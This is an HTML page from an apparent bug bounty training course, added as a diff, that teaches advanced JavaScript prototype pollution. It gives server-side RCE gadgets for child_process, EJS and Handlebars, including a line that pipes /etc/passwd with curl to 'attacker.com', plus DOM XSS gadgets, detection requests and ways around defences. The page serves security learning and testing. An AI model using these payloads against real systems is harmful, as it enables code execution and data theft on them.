@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Prototype Pollution (Advanced) - Bug Bounty Learning Path</title>
+    <link rel="stylesheet" href="../assets/style.css">
+    <style>
+        .complete-btn { display:inline-block; padding:0.5rem 1.2rem; border:1px solid var(--green); border-radius:6px; background:transparent; color:var(--green); cursor:pointer; font-size:0.85rem; transition:all 0.2s; }
+        .complete-btn:hover { background:var(--green); color:#000; }
+        .complete-btn.is-complete { background:var(--green); color:#000; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="breadcrumb">
+            <a href="../index.html">Top</a> &gt; Phase 4: Advanced &gt; Prototype Pollution (Advanced)
+        </div>
+
+        <div class="page-header">
+            <h1>Prototype Pollution (Advanced)</h1>
+            <p class="subtitle">
+                JavaScriptのprototypeチェーンを操作し、Server-side RCEまたはClient-side XSSを達成。
+                Node.jsアプリケーションおよびフロントエンドフレームワークの両方で深刻な影響を持つ。
+            </p>
+            <div style="margin-top:1rem;">
+                <span class="tag tag-theory">Theory</span>
+                <span class="tag tag-handson">Hands-on</span>
+                <span class="tag tag-casestudy">Case Study</span>
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Mechanism</h2>
+
+            <h3>JavaScript Prototype Chain</h3>
+            <pre><code>// Every JS object has a prototype chain
+const obj = {};
+obj.__proto__ === Object.prototype  // true
+
+// Properties are looked up through the chain:
+// obj.property → obj.__proto__.property → Object.prototype.property
+
+// POLLUTION: modifying Object.prototype affects ALL objects
+obj.__proto__.isAdmin = true;
+const newObj = {};
+newObj.isAdmin  // true! (inherited from polluted prototype)</code></pre>
+
+            <h3>Pollution Vectors</h3>
+            <pre><code>// Direct __proto__ assignment
+userInput = JSON.parse('{"__proto__": {"isAdmin": true}}');
+merge(target, userInput);
+// target.__proto__.isAdmin = true → ALL objects now have isAdmin=true
+
+// constructor.prototype (alternative path)
+userInput = {"constructor": {"prototype": {"isAdmin": true}}};
+merge(target, userInput);
+
+// Nested path notation
+obj["__proto__"]["polluted"] = "yes";
+obj["constructor"]["prototype"]["polluted"] = "yes";</code></pre>
+
+            <h3>Vulnerable merge/clone Functions</h3>
+            <pre><code>// Vulnerable deep merge (common in lodash < 4.17.12, etc.)
+function merge(target, source) {
+  for (let key in source) {
+    if (typeof source[key] === 'object') {
+      if (!target[key]) target[key] = {};
+      merge(target[key], source[key]);  // Recursion follows __proto__
+    } else {
+      target[key] = source[key];
+    }
+  }
+}
+
+// Attack:
+merge({}, JSON.parse('{"__proto__": {"polluted": true}}'));
+// Now: ({}).polluted === true  for ALL new objects!</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>Server-Side Exploitation (Node.js)</h2>
+
+            <h3>Gadget 1: RCE via child_process</h3>
+            <pre><code>// If application uses child_process.execSync/spawn somewhere:
+// Pollute environment variables or shell options
+
+// Target code (somewhere in the app):
+const { execSync } = require('child_process');
+execSync('ls', options);  // options inherits from prototype
+
+// Pollution:
+Object.prototype.shell = '/proc/self/exe';
+Object.prototype.env = { NODE_OPTIONS: '--require=/tmp/evil.js' };
+Object.prototype.argv0 = 'node';
+
+// Or more direct:
+Object.prototype.shell = true;
+Object.prototype.input = 'cat /etc/passwd | curl attacker.com -d @-';</code></pre>
+
+            <h3>Gadget 2: Template Injection (EJS/Pug/Handlebars)</h3>
+            <pre><code>// EJS gadget (most common in BB)
+// If app uses res.render() with EJS:
+
+// Pollution payload:
+{"__proto__": {
+  "outputFunctionName": "x;global.process.mainModule.require('child_process').execSync('id');s"
+}}
+
+// EJS template compilation includes:
+// var __output = [], __append = __output.push.bind(__output);
+// becomes:
+// var x;global.process.mainModule.require('child_process').execSync('id');s = ...
+// → RCE!</code></pre>
+
+            <h3>Gadget 3: Handlebars RCE</h3>
+            <pre><code>// Handlebars compileOptions pollution
+{"__proto__": {
+  "allowProtoMethodsByDefault": true,
+  "allowProtoPropertiesByDefault": true
+}}
+// Enables access to constructor → RCE via template:
+// {{#with "s" as |string|}}
+//   {{#with (string.sub.apply 0 (string.sub.call (string.sub.constructor "return this.process.mainModule.require('child_process').execSync('id')")))}}</code></pre>
+
+            <h3>Gadget 4: Express/Koa Status Code</h3>
+            <pre><code>// Pollute status or statusCode
+Object.prototype.status = 500;
+// All responses without explicit status → 500 Internal Server Error
+// DoS impact (availability)</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>Client-Side Exploitation (DOM XSS)</h2>
+
+            <h3>HTML Sanitizer Bypass</h3>
+            <pre><code>// DOMPurify gadgets (older versions)
+// Pollute allowed tags/attributes
+Object.prototype.ALLOWED_TAGS = ['img', 'script'];
+Object.prototype.ALLOWED_ATTR = ['onerror', 'src'];
+
+// Or bypass via:
+Object.prototype.document = { nodeType: 9 };  // Confuse DOMPurify's document detection</code></pre>
+
+            <h3>DOM Gadgets</h3>
+            <pre><code>// innerHTML gadgets
+Object.prototype.innerHTML = '&lt;img src=x onerror=alert(1)&gt;';
+// If code does: element.innerHTML = obj.content || defaults.content
+// And defaults inherits from prototype → XSS
+
+// srcdoc gadgets (iframe)
+Object.prototype.srcdoc = '&lt;script&gt;alert(document.domain)&lt;/script&gt;';
+
+// jQuery gadgets
+Object.prototype.url = 'javascript:alert(1)';
+Object.prototype.href = 'javascript:alert(1)';
+// jQuery .attr() or .prop() may use polluted values</code></pre>
+
+            <h3>URL Pollution for XSS</h3>
+            <pre><code>// If code constructs URLs from config objects:
+Object.prototype.protocol = 'javascript:';
+Object.prototype.hostname = 'alert(1)//';
+// URL(obj) → "javascript:alert(1)//..."</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>DOM Clobbering Relationship</h2>
+            <p>
+                DOM Clobberingは Prototype Pollution と似たeffectをHTMLレベルで達成する。
+                <code>name</code>属性やHTML ID属性で<code>window</code>オブジェクトの
+                プロパティを上書きする。
+            </p>
+            <pre><code>&lt;!-- DOM Clobbering: overwrite window.CONFIG --&gt;
+&lt;a id="CONFIG" href="javascript:alert(1)"&gt;&lt;/a&gt;
+
+&lt;script&gt;
+  // Developer expects CONFIG to be undefined or their object
+  if (window.CONFIG) {
+    location = CONFIG.href;  // → javascript:alert(1)
+  }
+&lt;/script&gt;
+
+&lt;!-- Nested clobbering for deeper properties --&gt;
+&lt;form id="CONFIG"&gt;&lt;input name="url" value="javascript:alert(1)"&gt;&lt;/form&gt;
+&lt;script&gt;
+  fetch(CONFIG.url);  // CONFIG.url = the input element's value
+&lt;/script&gt;</code></pre>
+        </div>
+
+        <div class="section">
+            <h2>Detection & Testing</h2>
+
+            <h3>Server-Side Detection</h3>
+            <pre><code># Send pollution payload in JSON body/query parameters
+POST /api/settings HTTP/1.1
+Content-Type: application/json
+
+{"__proto__": {"polluted": "yes"}}
+
+# Then check if pollution persists:
+GET /api/anything HTTP/1.1
+# If response includes "polluted" key or behavior changes → vulnerable
+
+# Or use constructor path:
+{"constructor": {"prototype": {"polluted": "yes"}}}</code></pre>
+
+            <h3>Client-Side Detection</h3>
+            <pre><code>// Check via URL parameters (common client-side vector)
+https://target.com/page?__proto__[polluted]=yes
+https://target.com/page?constructor.prototype.polluted=yes
+
+// Verify in browser console:
+({}).polluted  // "yes" → pollution successful!
+
+// Then find gadgets that use the polluted property</code></pre>
+
+            <h3>Gadget Discovery Process</h3>
+            <ol>
+                <li><strong>Confirm pollution</strong>: 任意のプロパティをObject.prototypeに設定可能か確認</li>
+                <li><strong>Identify sinks</strong>: コード内でpropertyがどこで使われるか調査</li>
+                <li><strong>Match known gadgets</strong>: 使用しているライブラリに既知のgadgetがないか確認</li>
+                <li><strong>Craft payload</strong>: gadgetに合わせたpollutionプロパティ名と値を設定</li>
+            </ol>
+
+            <h3>Known Vulnerable Libraries</h3>
+            <table>
+                <thead>
+                    <tr><th>Library</th><th>Function</th><th>Impact</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>lodash (&lt;4.17.12)</td><td>_.merge, _.defaultsDeep</td><td>Pollution source</td></tr>
+                    <tr><td>jQuery (&lt;3.4.0)</td><td>$.extend(true, ...)</td><td>Pollution source</td></tr>
+                    <tr><td>EJS</td><td>render()</td><td>RCE gadget</td></tr>
+                    <tr><td>Pug (Jade)</td><td>compile()</td><td>RCE gadget</td></tr>
+                    <tr><td>Handlebars</td><td>compile()</td><td>RCE gadget</td></tr>
+                    <tr><td>express-fileupload</td><td>parseNested</td><td>Pollution source</td></tr>
+                    <tr><td>minimist</td><td>parse()</td><td>Pollution source</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="section">
+            <h2>Tools</h2>
+            <table>
+                <thead>
+                    <tr><th>Tool</th><th>Purpose</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>PPScan</td><td>Automated prototype pollution scanner</td></tr>
+                    <tr><td>server-side-prototype-pollution (Burp)</td><td>Server-side PP detection</td></tr>
+                    <tr><td>ppmap</td><td>Client-side PP & gadget scanner</td></tr>
+                    <tr><td>cdnjs + grep</td><td>Identify vulnerable library versions</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="section">
+            <h2>Defense Bypass Techniques</h2>
+            <ul>
+                <li><strong>Object.freeze(Object.prototype)</strong> → bypass: use constructor.prototype path</li>
+                <li><strong>Key blacklist (__proto__)</strong> → bypass: <code>constructor.prototype</code>, unicode encoding</li>
+                <li><strong>Object.create(null)</strong> → this IS effective (no prototype chain)</li>
+                <li><strong>Map instead of Object</strong> → this IS effective</li>
+            </ul>
+
+            <div class="callout">
+                <div class="callout-title">BB Tips</div>
+                <p>
+                    多くのNode.jsアプリは <code>Object.create(null)</code> を全面適用していない。
+                    設定オブジェクトやユーザーinput処理のどこか1箇所でも
+                    通常のobject mergeを使っていれば攻撃可能。
+                    <code>package.json</code> の依存関係からlodash/jQuery等のバージョンを特定し、
+                    既知のpollution sourceを探すのが効率的。
+                </p>
+            </div>
+        </div>
+
+        <div class="page-nav">
+            <a href="46-http-smuggling.html">&larr; Prev: HTTP Request Smuggling</a>
+            <a href="48-mcp-llm-attacks.html">Next: LLM / MCP Attacks &rarr;</a>
+        </div>
+
+        <div style="margin-top:2rem; text-align:center;">
+            <button class="complete-btn" data-module-id="47-proto" onclick="toggleComplete('47-proto')">Mark Complete</button>
+        </div>
+    </div>
+    <script src="../assets/progress.js"></script>
+</body>
+</html>
